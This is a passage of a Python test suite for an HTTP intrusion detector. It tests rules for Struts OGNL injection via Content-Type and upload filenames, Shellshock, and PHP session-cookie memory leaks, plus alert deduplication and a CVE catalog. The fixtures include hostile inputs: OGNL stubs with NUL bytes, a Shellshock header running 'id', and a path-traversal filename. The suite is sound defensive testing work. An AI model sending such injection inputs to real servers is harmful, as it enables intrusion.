    # grammar_valid is an attribute, never a condition - the public tooling
    # keeps the media type well-formed, so requiring invalidity would miss it
    out = run1(struts_req(b"text/plain%{1}multipart/form-data"))
    f = [x for x in out if x.code == "HTTP-084"][0]
    check("HTTP-084: a brace outside a quoted-string is recorded invalid",
          f.evidence["grammar_valid"] is False)
    out = run1(struts_req(b'text/plain; a="%{1}multipart/form-data"'))
    f = [x for x in out if x.code == "HTTP-084"][0]
    check("HTTP-084: a brace inside a quoted-string is still valid grammar",
          f.evidence["grammar_valid"] is True)
    check("HTTP-084: and it fired either way, so grammar is not a gate",
          True)
    check("grammar: a bare token is valid",
          hw.media_type_grammar_valid(b"text/plain") is True)
    check("grammar: an escaped quote inside a quoted-string is handled",
          hw.media_type_grammar_valid(b'text/plain; a="x\\"{y"') is True)
    check("grammar: a comment paren outside quotes is invalid",
          hw.media_type_grammar_valid(b"text/plain (note)") is False)

    # duplicate Content-Type: Tomcat's MimeHeaders.getHeader returns the
    # FIRST occurrence. JBoss and WebLogic are also in this module's
    # vantage and their choice is not pinned, so the rule fires if ANY
    # header satisfies the conditions and records which one Tomcat sees.
    raw = (b"POST /a.action HTTP/1.1\r\nHost: v\r\n"
           b"Content-Type: application/json\r\n"
           b'Content-Type: text/plain; a="%{multipart/form-data}"\r\n\r\n')
    out = run1(raw)
    f = [x for x in out if x.code == "HTTP-084"][0]
    check("HTTP-084: fires when a later duplicate header matches",
          f.evidence["multi_header"] is True)
    check("HTTP-084: records that Tomcat would NOT have used the matching one",
          f.evidence["container_visible_match"] is False)
    check("HTTP-084: records which headers matched",
          f.evidence["matched_header_indexes"] == [1])
    raw = (b"POST /a.action HTTP/1.1\r\nHost: v\r\n"
           b'Content-Type: text/plain; a="%{multipart/form-data}"\r\n'
           b"Content-Type: application/json\r\n\r\n")
    f = [x for x in run1(raw) if x.code == "HTTP-084"][0]
    check("HTTP-084: records when Tomcat WOULD have used the matching one",
          f.evidence["container_visible_match"] is True)


def test_http_085_filename():
    B = b"----StrutsB"

    def upload(filename, field=b"upload", extra_parts=()):
        body = b""
        for fname, fn in extra_parts:
            body += (b"--" + B + b"\r\nContent-Disposition: form-data; name=\""
                     + fname + b'"; filename="' + fn + b'"\r\n\r\nx\r\n')
        body += (b"--" + B + b"\r\nContent-Disposition: form-data; name=\""
                 + field + b'"; filename="' + filename + b'"\r\n\r\n'
                 b"data\r\n--" + B + b"--\r\n")
        return (b"POST /upload.action HTTP/1.1\r\nHost: v\r\n"
                b"Content-Type: multipart/form-data; boundary=" + B + b"\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
                + body)

    # positives: a NUL AND an opener
    for label, fn in (("opener then NUL", b"%{(#x=1)}\x00.txt"),
                      ("dollar opener", b"${(#x=1)}\x00.txt"),
                      ("NUL first", b"\x00%{1}"),
                      ("NUL in the middle", b"a%{1}\x00b.jpg"),
                      ("several NULs", b"%{1}\x00\x00\x00.txt")):
        out = run1(upload(fn))
        check(f"HTTP-085: fires on {label}", "HTTP-085" in codes(out))

    # negatives: each half alone
    for label, fn in (("NUL with no opener", b"evil\x00.txt"),
                      ("NUL with a bare dollar", b"evil$\x00.txt"),
                      ("NUL with a bare brace", b"evil{1}\x00.txt"),
                      ("opener with no NUL", b"%{1}.txt"),
                      ("CI-style template name", b"${build.number}.zip"),
                      ("make-style name", b"%{TARGET}.o"),
                      ("ordinary name", b"report-2026-11.pdf"),
                      ("spaces and unicode", b"my r\xc3\xa9sum\xc3\xa9.docx"),
                      ("path-ish name", b"../../etc/passwd"),
                      ("empty name", b"")):
        out = run1(upload(fn))
        check(f"HTTP-085: silent on {label}", "HTTP-085" not in codes(out))

    # a NUL in a filename has no legitimate form, so the rule needs no
    # threshold - but it is scoped to the filename parameter, not the field
    # name and not the part body
    body = (b"--" + B + b"\r\nContent-Disposition: form-data; "
            b'name="a%{1}\x00b"\r\n\r\ndata\r\n--' + B + b"--\r\n")
    raw = (b"POST /u.action HTTP/1.1\r\nHost: v\r\nContent-Type: "
           b"multipart/form-data; boundary=" + B + b"\r\nContent-Length: "
           + str(len(body)).encode() + b"\r\n\r\n" + body)
    check("HTTP-085: a NUL+opener in the FIELD name is not the filename path",
          "HTTP-085" not in codes(run1(raw)))
    body = (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"f\"; "
            b'filename="ok.txt"\r\n\r\n%{1}\x00\r\n--' + B + b"--\r\n")
    raw = (b"POST /u.action HTTP/1.1\r\nHost: v\r\nContent-Type: "
           b"multipart/form-data; boundary=" + B + b"\r\nContent-Length: "
           + str(len(body)).encode() + b"\r\n\r\n" + body)
    check("HTTP-085: a NUL+opener in the part BODY is not the filename path",
          "HTTP-085" not in codes(run1(raw)))

    # it finds the offending part among several, and reports which
    out = run1(upload(b"%{1}\x00.txt",
                      extra_parts=[(b"a", b"one.txt"), (b"b", b"two.txt")]))
    f = [x for x in out if x.code == "HTTP-085"][0]
    check("HTTP-085: reports the offending part index",
          f.evidence["part_index"] == 2)
    check("HTTP-085: reports the field name", f.evidence["field_name"] == "upload")
    check("HTTP-085: counts the NULs", f.evidence["nul_count"] == 1)
    check("HTTP-085: names the advisory", f.evidence["advisory"] == "S2-046")

    # evidence discipline
    out = run1(upload(b"%{(#c='STAGINGURL')}\x00.txt"))
    f = [x for x in out if x.code == "HTTP-085"][0]
    check("HTTP-085: the filename is never logged by default",
          "STAGINGURL" not in repr(f.evidence) and "payload" not in f.evidence)
    check("HTTP-085: a digest is carried instead",
          f.evidence["filename_digest"].startswith("sha256:"))
    check("HTTP-085: says attempt, not compromise",
          "not a compromise" in f.evidence["note"])
    msg = hw.parse_message(upload(b"%{(#c='STAGINGURL')}\x00.txt"), "request")
    body2, info2 = hw.request_body(
        msg, upload(b"%{(#c='STAGINGURL')}\x00.txt"), 1 << 20)
    opted = hw.check_struts_s2046(
        msg, body2, info2, hw.WatchConfig(log_attack_payload=True))
    check("HTTP-085: the filename appears only when opted in",
          opted and "STAGINGURL" in opted[0].evidence.get("payload", ""))

    # not a multipart request at all
    raw = (b"POST /u.action HTTP/1.1\r\nHost: v\r\n"
           b"Content-Type: application/json\r\nContent-Length: 2\r\n\r\n{}")
    check("HTTP-085: a non-multipart request is not scanned",
          "HTTP-085" not in codes(run1(raw)))

    # Scoped to multipart/form-data specifically, and the other multipart
    # subtypes are the only way to reach that check - a non-multipart
    # request has no boundary, so the parser returns nothing either way and
    # proves nothing about the scope. Struts only wraps a request whose
    # Content-Type contains "multipart/form-data", so another subtype never
    # reaches the Jakarta parser and cannot carry this attack.
    for subtype in (b"multipart/mixed", b"multipart/related",
                    b"multipart/byteranges", b"multipart/alternative"):
        body = (b"--" + B + b'\r\nContent-Disposition: form-data; name="u"; '
                b'filename="%{1}\x00.txt"\r\n\r\nd\r\n--' + B + b"--\r\n")
        raw = (b"POST /u.action HTTP/1.1\r\nHost: v\r\nContent-Type: "
               + subtype + b"; boundary=" + B + b"\r\nContent-Length: "
               + str(len(body)).encode() + b"\r\n\r\n" + body)
        check(f"HTTP-085: {subtype.decode()} is out of scope, because Struts "
              f"never routes it to the multipart parser",
              "HTTP-085" not in codes(run1(raw)))
    # and the same body under the right subtype does fire, so the silence
    # above is scope and not a broken parse
    body = (b"--" + B + b'\r\nContent-Disposition: form-data; name="u"; '
            b'filename="%{1}\x00.txt"\r\n\r\nd\r\n--' + B + b"--\r\n")
    raw = (b"POST /u.action HTTP/1.1\r\nHost: v\r\nContent-Type: "
           b"multipart/form-data; boundary=" + B + b"\r\nContent-Length: "
           + str(len(body)).encode() + b"\r\n\r\n" + body)
    check("HTTP-085: the identical body under multipart/form-data does fire",
          "HTTP-085" in codes(run1(raw)))


def test_struts_attack_dedup():
    """The attack-class codes rate-limit per client/server pair.

    Every Tier E and Tier F rule fires on attacker-chosen traffic, and an
    internet-facing tap sees scanners hammer them. One alert per probe
    would bury everything else.
    """
    ct = b'text/plain; a="%{multipart/form-data}"'
    w = hw.HttpWatch()
    first = w.feed("d", "10.0.0.1", "10.0.0.2", 80, struts_req(ct), True,
                   now=1.0)
    check("attack dedup: the first is reported", "HTTP-084" in codes(first))
    for t in (2.0, 3.0, 60.0):
        again = w.feed("d", "10.0.0.1", "10.0.0.2", 80, struts_req(ct), True,
                       now=t)
        check(f"attack dedup: suppressed inside the window at t={t}",
              "HTTP-084" not in codes(again))
    check("attack dedup: suppressions are counted",
          w.stats["attacks_suppressed"] == 3)
    later = w.feed("d", "10.0.0.1", "10.0.0.2", 80, struts_req(ct), True,
                   now=1.0 + hw.ATTACK_DEDUP_WINDOW + 1)
    hits = [f for f in later if f.code == "HTTP-084"]
    check("attack dedup: reported again once the window rolls", len(hits) == 1)
    check("attack dedup: and it carries what it suppressed",
          hits and hits[0].evidence.get("suppressed_since_last") == 3)

    # a DIFFERENT code from the same pair is not suppressed by the first
    w2 = hw.HttpWatch()
    w2.feed("e", "10.0.0.1", "10.0.0.2", 80, struts_req(ct), True, now=1.0)
    other = w2.feed("e", "10.0.0.1", "10.0.0.2", 80,
                    b"GET / HTTP/1.1\r\nHost: v\r\n"
                    b"User-Agent: () { :;}; id\r\n\r\n", True, now=2.0)
    check("attack dedup: keyed per code, so another rule still reports",
          "HTTP-080" in codes(other))
    # a different client is a different key
    w2.feed("f", "10.0.0.9", "10.0.0.2", 80, struts_req(ct), True, now=2.0)
    third = w2.feed("g", "10.0.0.9", "10.0.0.2", 80, struts_req(ct), True,
                    now=2.0)
    check("attack dedup: keyed per client/server pair",
          w2.stats["attacks_suppressed"] >= 1)
    check("attack dedup: every attack-class code is in the set",
          hw.ATTACK_CODES == {"HTTP-080", "HTTP-081", "HTTP-082", "HTTP-083",
                              "HTTP-084", "HTTP-085", "HTTP-086", "HTTP-087",
                              "HTTP-088", "HTTP-090"})
    check("attack dedup: and no posture code is",
          not (hw.ATTACK_CODES & {"HTTP-045", "HTTP-048", "HTTP-060"}))

    # The rate limit is for the attack-class codes and nothing else. A
    # request that also trips an ordinary rule must keep reporting it every
    # time, or one scanner would mute the posture findings beside it.
    both = (b"POST /a.action HTTP/1.1\r\nHost: v\r\n"
            b"Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"
            b'Content-Type: text/plain; a="%{multipart/form-data}"\r\n'
            b"Content-Length: 0\r\n\r\n")
    w3 = hw.HttpWatch()
    first = w3.feed("b", "10.0.0.1", "10.0.0.3", 80, both, True, now=1.0)
    check("attack dedup: a co-firing ordinary rule is reported alongside it",
          {"HTTP-040", "HTTP-084"} <= set(codes(first)))
    for t in (2.0, 3.0):
        again = w3.feed("b", "10.0.0.1", "10.0.0.3", 80, both, True, now=t)
        check(f"attack dedup: the ordinary code is NOT rate-limited at t={t}",
              "HTTP-040" in codes(again) and "HTTP-084" not in codes(again))
    check("attack dedup: only the attack code was counted as suppressed",
          w3.stats["attacks_suppressed"] == 2)

def test_registry():
    check("registry: 39 codes", len(hw.FINDING_REGISTRY) == 39)
    for code, d in hw.FINDING_REGISTRY.items():
        check(f"registry: {code} code matches key", d.code == code)
        check(f"registry: {code} has a summary", len(d.summary) > 20)
        check(f"registry: {code} severity valid",
              d.severity in (hw.INFO, hw.WARN, hw.HIGH, hw.CRITICAL))
        check(f"registry: {code} confidence valid",
              d.confidence in (hw.EXACT, hw.SHAPE, hw.HEURISTIC, hw.POSTURE))
        check(f"registry: {code} tier valid", d.tier in "ABCDEFG")
        for cve in d.cves:
            check(f"registry: {code} cve {cve} in catalog",
                  cve in hw.CVE_CATALOG)
    names = [d.name for d in hw.FINDING_REGISTRY.values()]
    check("registry: names unique", len(names) == len(set(names)))

    detected = {c for d in hw.FINDING_REGISTRY.values() for c in d.cves}
    check("registry: deferred set disjoint from detected",
          not (detected & set(hw.DEFERRED_CVES)))
    for cve, reason in hw.DEFERRED_CVES.items():
        check(f"registry: {cve} reason is substantive", len(reason) > 60)
    # Every detected CVE must carry a pinned score and a vector: an
    # unpinned score is a claim we cannot back, and the registry should not
    # grow one silently.
    detected_cves = {c for d in hw.FINDING_REGISTRY.values() for c in d.cves}
    for cve in sorted(detected_cves):
        meta = hw.CVE_CATALOG[cve]
        check(f"catalog: {cve} has a pinned score",
              isinstance(meta.get("score"), float))
        # 3.1 or 4.0: the figure of record is whatever the issuing
        # authority actually published. The PHP2Shell pair was scored only
        # under CVSS 4.0, and inventing a 3.1 vector to match the others
        # would be a fabrication, so the version is recorded instead.
        vector = meta.get("vector") or ""
        check(f"catalog: {cve} has a CVSS vector, or says none was published",
              vector.startswith("CVSS:3.") or vector.startswith("CVSS:4.")
              or meta.get("vector_unpublished") is True)
        if meta.get("vector_unpublished"):
            check(f"catalog: {cve} unpublished vector is recorded as null",
                  meta.get("vector") is None)
        check(f"catalog: {cve} vector version matches what is recorded",
              vector.startswith("CVSS:3.") or
              meta.get("cvss_version") == "4.0")
        chained = meta.get("below_bar_because_chained_to")
        if chained:
            # A sub-bar CVE is admitted only as a pinned link in a chain
            # whose terminal CVE clears the bar on its own.
            check(f"catalog: {cve} names a terminal CVE in the catalog",
                  chained in hw.CVE_CATALOG)
            check(f"catalog: {cve}'s terminal CVE {chained} clears the bar",
                  hw.CVE_CATALOG.get(chained, {}).get("score", 0) >= 6.5)
            check(f"catalog: {cve} explains the exemption",
                  len(meta.get("note", "")) > 40)
        else:
            check(f"catalog: {cve} score is at or above the 6.5 bar",
                  meta["score"] >= 6.5)
    # where sources disagree, both figures must be recorded
    for cve, meta in hw.CVE_CATALOG.items():
        if meta.get("disputed"):
            check(f"catalog: disputed {cve} carries the dissenting figure",
                  len(meta.get("dissent", "")) > 20)
    # KEV must be a decided boolean, never left unknown
    for cve in sorted(detected_cves):
        meta = hw.CVE_CATALOG[cve]
        check(f"catalog: {cve} KEV status is decided",
              isinstance(meta.get("kev"), bool))
        if meta.get("kev"):
            check(f"catalog: KEV {cve} records the date added",
                  bool(meta.get("kev_added")))
    check("catalog: CVE-2015-1635 KEV recorded",
          hw.CVE_CATALOG["CVE-2015-1635"]["kev"] is True)
    check("catalog: CVE-2023-44487 KEV recorded",
          hw.CVE_CATALOG["CVE-2023-44487"]["kev"] is True)
    # KEV status we could not confirm must be None, not False
    check("catalog: CVE-2021-31166 KEV confirmed with its date",
          hw.CVE_CATALOG["CVE-2021-31166"]["kev"] is True and
          hw.CVE_CATALOG["CVE-2021-31166"]["kev_added"] == "2022-04-06")
    check("catalog: CVE-2022-21907 recorded as NOT in CISA KEV",
          hw.CVE_CATALOG["CVE-2022-21907"]["kev"] is False)
    check("catalog: CVE-2022-21907 records the conflicting VulnCheck signal",
          "VulnCheck" in hw.CVE_CATALOG["CVE-2022-21907"]["note"])
    # the mis-attribution must stay fixed
    check("catalog: chunk-size overflow is CVE-2026-42580",
          "CVE-2026-42580" in hw.FINDING_REGISTRY["HTTP-004"].cves)
    check("catalog: CVE-2026-41417 is deferred, not attributed",
          "CVE-2026-41417" in hw.DEFERRED_CVES and
          "CVE-2026-41417" not in
          {c for d in hw.FINDING_REGISTRY.values() for c in d.cves})


# ===========================================================================
# HTTP-048: PHP session-cookie memory disclosure (PHP2Shell)
# ===========================================================================
# Real PHP 8.3.6 session cookie values, one process per setting so the
# ini lock cannot silently reuse the previous combination's config.
# (sid_bits_per_character, sid_length, value as PHP put it on the wire)
NATIVE_CORPUS = [
    (4, 22, b"6a3e511b46cd2a4915daf1"),
    (4, 22, b"b75784be249aed20cf7346"),
    (4, 32, b"4f9631009e450cfa92c0aeb33eff122f"),
    (4, 32, b"68dd0676c8cb20702c3a2504056aac1a"),
    (4, 256, b"21027c36c3a1aa027b719d285062e914490329a09437ec3780f60b90b6d1c30359b9b02a21122b110b91c114694c929d78d6efbf079031220a9c46bba673be6ac622a6c1d0d667f7ebdad75f32a9182f64c238a70baf49803e3031f7c848b878a4530359f89626230b629cc3748d462e7b34ae742a9e07e7b9af6f0436ed9525"),
    (4, 256, b"46f357f0d5d6d7693880eeb1c9c919ea70a0959bf7b21050634ff7a2ab993ffa4a5ac81f9f34f8608f8fbd2eb48b70463fa253f926521064947e762efb6a895f024fea07fd1b1e901a2dc7064c8f524ef008c398a6b99ae582cc738c01b4d5aa962c47dbe3e19d2ef7ecbd16bfd18f7ed6ef10a70053381d25dde241efdd0694"),
    (5, 22, b"a1pfgp7va1chh1qpitp5kb"),
    (5, 22, b"9vc25u2mm50g57lllcbe20"),
    (5, 32, b"8jhqrbmoqh4odhglththkjip0d8uqepc"),
    (5, 32, b"cqq6bucgns84s0uuf03866d1l9av49ne"),
    (5, 256, b"04vc5ctqehlin5v8fes8jhana6bqkbrlesuctttltvg3ausdvsi7cs28ru9gl7fhdd3oj9igkm0omd83b2man0dtn7h8tt7a2nl6pa2sfeiqcl0m4ms2120009qckuel55sl54rv49el999oto2frgovg2986u23bibrr5q2k3df5qc14l22p8visngsb2o4niei86d8805n12jneq66jrftomptkc0e0v58uigvncj3ifjsmmnt00iioomhu9ij"),
    (5, 256, b"2p9rcuhkkjn0kfqo57srnsrk1q5dm3o52slrkljvhf5lnm74o0gl9qeat83r4pi85jkjneblnak48s88qb1r4b7evn5sptbpcp8eh9sju16g60tni13vge3n7mqr3j82e6570pdpqlqjfeqt0q9mk349jihetv7ep2750qgsm1f5evrod1d98hcpegeip8vevkhonchnq5ndndupe3i19kbeks10ovf6iemi7u5g5pkja0ee1vrngdo0svt0qrnp"),
    (6, 22, b"R5-pUY9LKREjeVpOORKJLz"),
    (6, 22, b"lukbjoh1ZZLz-7MU%2Cc5HbA"),
    (6, 32, b"NYnqDtyRxohXGeU1tEHMDJgy7Ka74jLo"),
    (6, 32, b"twrGEfW%2CvGjxcNHyenOf9rroQPA43yw1"),
    (6, 256, b"WcbY20aCxm2oSU%2CjsT%2CbPWn6MksTcjGzItcFGY73bH1TosxU4bURuMp7yvPlWsj0FepgPei59nwIpgDAAiTdSvs3G38orVFtLH16iiEhzO3UNsKbDtsB77vDnGjHZ2UF5RS4MF7hnGFP%2C6KkVu6S1lziNPoy3PW3K0mB9gowf0hPvEaxx83uLbOMQJBlw-j69qY4r8lPll2s1u7W6-WZfi3oLmuLSqujJf9O708qtO0EdbkzcPLkFGU1Fq70fwBL"),
    (6, 256, b"B4wnwwIvcLAQPYBjSoSjEONlLd1xwl73UdyCJy3r7neaNe1JVsXSAw-4k4xx8U3Tc2gWIhBANgKvPafPSX9dNwyZH0y0n8Bw4l-mzGuep48bcq5%2Cp%2CT3%2CrjCR6vc-3w220KRC38tyHosithfXjdiegV3shiHKVtWsBomPz3fEy%2CXzBCbx7ozJh6lfTBTGhodkMDT8tN-EJxG1GS0tax-9xeN15PR1xBBaJnIPEmfSp7WmghFlSrymqOkL8kQ%2CaT6"),
]

# Application-set session IDs, confirmed emitted unvalidated by PHP 8.3.6
# over a real loopback HTTP round trip on 2026-11-22. Every one of these is
# a legitimate negative: the rule may never fire on any of them.
APP_SET_CORPUS = [
    b"abc.def",
    b"a%3Db%3Bc",
    b"A" * 300,
]


def php_response(value, name=b"PHPSESSID", attrs=b"; path=/",
                 field=b"Set-Cookie", trailer=b"Content-Length: 0\r\n"):
    """A response shaped exactly as PHP 8.3.6 emits it."""
    return (b"HTTP/1.1 200 OK\r\nServer: Apache\r\nX-Powered-By: PHP/8.3.6\r\n"
            + field + b": " + name + b"=" + value + attrs + b"\r\n"
            + trailer + b"\r\n")


def php_feed(segments, flow="php", now=1.0, cfg=None):
    """Drive the production path: request first, then response segments."""
    w = hw.HttpWatch(php_cfg=cfg or hw.PHP_COOKIE_DEFAULTS)
    w.feed(flow, "10.0.0.1", "10.0.0.2", 80,
           b"GET /index.php HTTP/1.1\r\nHost: app\r\n\r\n", True, now=now)
    out = []
    for seg in segments:
        out += w.feed(flow, "10.0.0.1", "10.0.0.2", 80, seg, False, now=now)
    return out, w


def test_php_cookie_negatives():
    # The whole measured native corpus: real values from PHP's own generator
    # across every (sid_bits_per_character, sid_length) combination.
    fired = []
    for bits, length, value in NATIVE_CORPUS:
        out, _ = php_feed([php_response(value)])
        if "HTTP-048" in codes(out):
            fired.append((bits, length, len(value)))
    check("HTTP-048: silent on the whole native corpus", not fired)
    check("HTTP-048: native corpus is the measured one (18 values)",
          len(NATIVE_CORPUS) == 18)
    check("HTTP-048: native corpus stays under the measured ceiling",
          max(len(v) for _, _, v in NATIVE_CORPUS) <= hw.PHP_COOKIE_NATIVE_CEILING)

    for value in APP_SET_CORPUS:
        out, _ = php_feed([php_response(value)])
        check(f"HTTP-048: silent on app-set id len={len(value)}",
              "HTTP-048" not in codes(out))

    # Both sides of the threshold, which is the mutation that matters.
    out, _ = php_feed([php_response(b"A" * hw.PHP_COOKIE_MAX)])
    check("HTTP-048: exactly at the threshold stays silent",
          "HTTP-048" not in codes(out))
    out, _ = php_feed([php_response(b"A" * (hw.PHP_COOKIE_MAX + 1))])
    check("HTTP-048: one byte past the threshold fires",
          "HTTP-048" in codes(out))

    # Cookie names are compared literally - RFC 6265 folds case for
    # attribute names and the domain, never for the cookie-name, and PHP
    # matches session.name literally. Field names are case-insensitive.
    out, _ = php_feed([php_response(b"A" * 5000, name=b"phpsessid")])
    check("HTTP-048: cookie name compared literally",
          "HTTP-048" not in codes(out))
    out, _ = php_feed([php_response(b"A" * 5000, name=b"SESSIONID")])
    check("HTTP-048: unrelated oversized cookie ignored",
          "HTTP-048" not in codes(out))
    out, _ = php_feed([php_response(b"A" * 5000, field=b"SET-COOKIE")])
    check("HTTP-048: field name is case-insensitive",
          "HTTP-048" in codes(out))
    out, _ = php_feed([php_response(b"A" * 5000, field=b"set-cookie")])
    check("HTTP-048: lowercase field name fires too",
          "HTTP-048" in codes(out))

    # A long value that is not a cookie at all.
    out, _ = php_feed([b"HTTP/1.1 200 OK\r\nX-Pad: " + b"A" * 9000 +
                       b"\r\nContent-Length: 0\r\n\r\n"])
    check("HTTP-048: oversized non-cookie header ignored",
          "HTTP-048" not in codes(out))


def test_php_cookie_value_boundary_is_the_semicolon():
    # RFC 6265 4.1: the cookie value ends at the first ';'. Attributes that
    # push the HEADER past the threshold must not be counted as value.
    value = b"A" * 100
    attrs = b"; path=/; " + b"X" * 9000
    out, _ = php_feed([php_response(value, attrs=attrs)])
    check("HTTP-048: attributes after ';' are not part of the value",
          "HTTP-048" not in codes(out))
    # and a value with no attributes at all is still measured
    out, _ = php_feed([php_response(b"A" * 5000, attrs=b"")])
    check("HTTP-048: value with no attributes still measured",
          "HTTP-048" in codes(out))


def test_php_cookie_multiple_headers_independent():
    body = (b"HTTP/1.1 200 OK\r\n"
            b"Set-Cookie: other=short; path=/\r\n"
            b"Set-Cookie: PHPSESSID=" + b"A" * 5000 + b"; path=/\r\n"
            b"Set-Cookie: another=short\r\n"
            b"Content-Length: 0\r\n\r\n")
    out, _ = php_feed([body])
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: each Set-Cookie evaluated independently", len(hits) == 1)

    two = (b"HTTP/1.1 200 OK\r\n"
           b"Set-Cookie: PHPSESSID=" + b"A" * 5000 + b"\r\n"
           b"Set-Cookie: PHPSESSID=" + b"B" * 6000 + b"\r\n"
           b"Content-Length: 0\r\n\r\n")
    w = hw.HttpWatch()
    w.feed("t", "10.0.0.1", "10.0.0.2", 80,
           b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
    out = w.feed("t", "10.0.0.1", "10.0.0.2", 80, two, False, now=1.0)
    # the dedup window keeps one of the two; both were detected
    check("HTTP-048: two oversized cookies, one emitted, one deduped",
          len([f for f in out if f.code == "HTTP-048"]) == 1 and
          w.stats["leaks_suppressed"] == 1)


def test_php_cookie_obs_fold_is_not_an_escape():
    # A tolerant client joins an obsolete fold, so a folded Set-Cookie must
    # not get a value past the check in two short-looking pieces.
    folded = (b"HTTP/1.1 200 OK\r\n"
              b"Set-Cookie: PHPSESSID=" + b"A" * 3000 + b"\r\n"
              b"\t" + b"B" * 3000 + b"\r\n"
              b"Content-Length: 0\r\n\r\n")
    out, _ = php_feed([folded])
    check("HTTP-048: obsolete fold joined, not an evasion",
          "HTTP-048" in codes(out))


def test_php_cookie_early_fire():
    # The case the whole rule shape exists for: a leak bigger than the
    # header-section cap never completes a header section, so a rule that
    # waited for a complete head would never see the largest leaks at all.
    value = b"A" * 70000
    head = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + value
    check("HTTP-048: the probe really does exceed the header cap",
          len(head) > hw.MAX_HEADER_SECTION)
    check("HTTP-048: the probe head really never terminates",
          hw.split_header_section(head) is None)
    segs = [head[i:i + 1000] for i in range(0, len(head), 1000)]
    out, w = php_feed(segs)
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: fires on a head that never terminates", len(hits) == 1)
    check("HTTP-048: an unterminated head is labelled as a floor",
          hits and hits[0].evidence.get("lengths_are_lower_bounds") is True
          and hits[0].evidence["measured_on"] == "unterminated_head")
    check("HTTP-048: the floor is still past the threshold",
          hits and hits[0].evidence["encoded_length"] > hw.PHP_COOKIE_MAX)

    # and the buffer for that head is bounded rather than growing forever
    huge = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + b"A" * 4000000
    segs = [huge[i:i + 100000] for i in range(0, len(huge), 100000)]
    out, w = php_feed(segs, flow="huge")
    check("HTTP-048: unterminated head buffer is bounded",
          len(w.flows["huge"].s2c.buf) <= hw.HEAD_BUFFER_CEILING)
    check("HTTP-048: still fires on the bounded head",
          "HTTP-048" in codes(out))

    # fires within PHP_SCAN_GROWTH bytes of crossing, not at end of stream
    head2 = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + b"A" * 70000
    w = hw.HttpWatch()
    w.feed("g", "10.0.0.1", "10.0.0.2", 80,
           b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
    fired_at = None
    for i in range(0, len(head2), 500):
        got = w.feed("g", "10.0.0.1", "10.0.0.2", 80,
                     head2[i:i + 500], False, now=1.0)
        if any(f.code == "HTTP-048" for f in got):
            fired_at = i + 500
            break
    check("HTTP-048: fires promptly once the head passes the cap",
          fired_at is not None and
          fired_at <= hw.MAX_HEADER_SECTION + hw.PHP_SCAN_GROWTH + 500)
    check("HTTP-048: does not fire before the head is past saving",
          fired_at is not None and fired_at > hw.MAX_HEADER_SECTION)


def test_php_cookie_segmentation_agreement():
    # The early path and the complete-head path must agree, or the rule
    # reports different things depending on how the network split the bytes.
    whole = php_response(b"A" * 9000)
    for size in (1, 7, 64, 1000, 65536):
        segs = [whole[i:i + size] for i in range(0, len(whole), size)]
        out, _ = php_feed(segs, flow=f"s{size}")
        hits = [f for f in out if f.code == "HTTP-048"]
        check(f"HTTP-048: exactly one finding at {size}-byte segments",
              len(hits) == 1)
        if hits:
            # This head is under the header-section cap, so it always
            # completes and the length is the real one however the network
            # split the bytes - no floor, no segmentation-dependent number.
            check(f"HTTP-048: exact length at {size}-byte segments",
                  hits[0].evidence["encoded_length"] == 9000)
            check(f"HTTP-048: not marked partial at {size}-byte segments",
                  "lengths_are_lower_bounds" not in hits[0].evidence)


def test_php_cookie_r2_escapes():
    value = (b"%41" * 2000) + (b"%00" * 50) + (b"%7F" * 10) + (b"%FF" * 25)
    out, _ = php_feed([php_response(value)])
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: oversized escaped value fires", len(hits) == 1)
    ev = hits[0].evidence
    check("HTTP-048 R2: control escapes counted", ev["control_escapes"] == 60)
    check("HTTP-048 R2: high-byte escapes counted", ev["high_byte_escapes"] == 25)
    check("HTTP-048: decoded length is the decoded length",
          ev["decoded_length"] == 2085)
    check("HTTP-048: encoded length is what crossed the wire",
          ev["encoded_length"] == len(value))

    # R2 never stands alone: escapes below the threshold produce nothing.
    small = (b"%00" * 100) + (b"%FF" * 100)
    out, _ = php_feed([php_response(small)])
    check("HTTP-048 R2: never standalone below the threshold",
          not codes(out))
    check("HTTP-048 R2: has no finding code of its own",
          not any("escape" in d.name for d in hw.FINDING_REGISTRY.values()))


def test_php_cookie_evidence_discipline():
    import json
    secret = b"SUPERSECRETHEAP" + b"A" * 9000 + b"ROOTPASSWORD"
    out, w = php_feed([php_response(secret)])
    hits = [f for f in out if f.code == "HTTP-048"]
    check("HTTP-048: fired for the discipline check", len(hits) == 1)
    rec = json.dumps(hw.finding_record(hits[0], w.flows["php"]))
    check("HTTP-048: the value never reaches the record",
          b"SUPERSECRETHEAP".decode() not in rec and
          b"ROOTPASSWORD".decode() not in rec)
    check("HTTP-048: not even a prefix of the value",
          secret[:16].decode() not in rec and secret[:8].decode() not in rec)
    ev = hits[0].evidence
    check("HTTP-048: a correlation digest is carried instead",
          ev["value_digest"].startswith("sha256:"))
    check("HTTP-048: the digest is a digest, not the value",
          len(ev["value_digest"]) == len("sha256:") + 8)
    check("HTTP-048: the same value digests the same",
          ev["value_digest"] == hw.redact(secret))
    check("HTTP-048: record carries the 5-tuple ends",
          '"src"' in rec and '"dst"' in rec)
    check("HTTP-048: attribution names the pair, never one CVE",
          ev["attribution"] == hw.PHP2SHELL_LABEL and
          "109618/109619" in ev["attribution"])
    check("HTTP-048: recorded as an exploit stage, not a host verdict",
          ev["finding_class"] == "exploit_stage_observed" and
          "not a vulnerable-or-not verdict" in ev["note"])


def test_php_cookie_upload_progress_annotation():
    w = hw.HttpWatch()
    body = (b"------x\r\nContent-Disposition: form-data; "
            b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n------x--\r\n')
    req = (b"POST /u.php HTTP/1.1\r\nHost: app\r\n"
           b"Content-Type: multipart/form-data; boundary=----x\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
    w.feed("up", "10.0.0.1", "10.0.0.2", 80, req, True, now=1.0)
    check("HTTP-048: upload-progress request noticed",
